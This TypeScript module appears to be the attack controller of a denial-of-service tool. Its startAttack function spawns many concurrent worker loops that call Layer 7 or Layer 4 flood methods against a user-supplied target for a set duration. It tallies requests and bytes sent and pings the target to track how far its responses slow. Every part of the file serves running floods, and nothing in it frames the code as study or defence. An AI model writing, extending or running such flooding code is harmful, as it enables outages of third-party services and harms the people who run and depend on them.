import { getLayer7Method, getLayer4Method } from "./methods"
import type { MethodType } from "./config"

export type AttackState = {
  id: string
  method: string
  methodType: MethodType
  target: string
  running: boolean
  requests: number
  bytes: number
  startTime: number
  logs: string[]
  pingHistory: { time: number; ms: number }[]
  requestHistory: { time: number; requests: number; bytes: number }[]
}

type AttackEntry = {
  state: AttackState
  historyIv: ReturnType<typeof setInterval>
  pingIv: ReturnType<typeof setInterval>
  flushIv: ReturnType<typeof setInterval>
}

const attacks = new Map<string, AttackEntry>()
const listeners: Set<(s: AttackState[]) => void> = new Set()

let lastNotify = 0
const NOTIFY_THROTTLE_MS = 150

export function getState(): AttackState[] {
  return Array.from(attacks.values()).map((e) => e.state)
}

export function subscribe(cb: (s: AttackState[]) => void) {
  listeners.add(cb)
  return () => listeners.delete(cb)
}

function notify(force = false) {
  const now = Date.now()
  if (!force && now - lastNotify < NOTIFY_THROTTLE_MS) return
  lastNotify = now
  const all = getState()
  listeners.forEach((cb) => cb(all))
}

function log(attackState: AttackState, msg: string) {
  attackState.logs.push(`[${new Date().toISOString().slice(11, 19)}] ${msg}`)
  if (attackState.logs.length > 200) attackState.logs.shift()
  notify(true)
}

export function stopAttack(id?: string) {
  if (id) {
    const entry = attacks.get(id)
    if (entry) {
      entry.state.running = false
      clearInterval(entry.historyIv)
      clearInterval(entry.pingIv)
      clearInterval(entry.flushIv)
      attacks.delete(id)
      log(entry.state, "Attack stopped")
      notify(true)
    }
    return
  }
  for (const [, entry] of Array.from(attacks)) {
    entry.state.running = false
    clearInterval(entry.historyIv)
    clearInterval(entry.pingIv)
    clearInterval(entry.flushIv)
    log(entry.state, "Attack stopped")
  }
  attacks.clear()
  notify(true)
}

export async function startAttack(
  id: string,
  method: string,
  methodType: MethodType,
  target: string,
  threads: number,
  rpc: number,
  duration: number
) {
  const url = target.startsWith("http") ? target : `http://${target}`
  const attackState: AttackState = {
    id,
    method,
    methodType,
    target: url,
    running: true,
    requests: 0,
    bytes: 0,
    startTime: Date.now(),
    logs: [],
    pingHistory: [],
    requestHistory: [],
  }

  const historyIv = setInterval(() => {
    if (attackState.running) {
      attackState.requestHistory.push({
        time: Date.now(),
        requests: attackState.requests,
        bytes: attackState.bytes,
      })
      if (attackState.requestHistory.length > 120) attackState.requestHistory.shift()
      notify()
    }
  }, 1000)

  log(attackState, `Starting ${method} attack on ${url} (${threads} threads, ${duration}s)`)
  notify(true)

  const floodFn = methodType === "layer7" ? getLayer7Method(method) : getLayer4Method(method)
  if (!floodFn) {
    log(attackState, `Method ${method} not available`)
    attackState.running = false
    clearInterval(historyIv)
    notify(true)
    return
  }

  let pendingReq = 0
  let pendingBytes = 0
  const flushIv = setInterval(() => {
    if (attackState.running && (pendingReq > 0 || pendingBytes > 0)) {
      attackState.requests += pendingReq
      attackState.bytes += pendingBytes
      pendingReq = 0
      pendingBytes = 0
      notify()
    }
  }, 100)

  const onStats = (req: number, bytes: number) => {
    if (attackState.running) {
      pendingReq += req
      pendingBytes += bytes
    }
  }

  const pingIv = setInterval(async () => {
    if (!attackState.running) return
    try {
      const start = Date.now()
      await fetch(attackState.target, { method: "HEAD", signal: AbortSignal.timeout(5000) })
      const ms = Date.now() - start
      attackState.pingHistory.push({ time: Date.now(), ms })
      if (attackState.pingHistory.length > 60) attackState.pingHistory.shift()
      notify()
    } catch {
      attackState.pingHistory.push({ time: Date.now(), ms: -1 })
      if (attackState.pingHistory.length > 60) attackState.pingHistory.shift()
      notify()
    }
  }, 2000)

  attacks.set(id, { state: attackState, historyIv, pingIv, flushIv })

  const endTime = Date.now() + duration * 1000
  const workers: Promise<void>[] = []
  const YIELD_EVERY = 3

  for (let i = 0; i < threads; i++) {
    workers.push(
      (async () => {
        let iter = 0
        try {
          while (attackState.running && Date.now() < endTime) {
            await floodFn(url, rpc, onStats)
            iter++
            if (iter % YIELD_EVERY === 0) {
              await new Promise((r) => setImmediate(r))
            }
          }
        } catch (err) {
          if (attackState.running) log(attackState, `Worker error: ${err}`)
        }
      })()
    )
  }

  try {
    await Promise.all(workers)
  } catch (err) {
    if (attackState.running) log(attackState, `Attack error: ${err}`)
  }

  clearInterval(flushIv)
  clearInterval(pingIv)
  clearInterval(historyIv)
  attacks.delete(id)

  attackState.requests += pendingReq
  attackState.bytes += pendingBytes
  attackState.running = false
  log(attackState, `Attack finished. Total: ${attackState.requests} req, ${(attackState.bytes / 1024).toFixed(1)} KB`)
  notify(true)
}
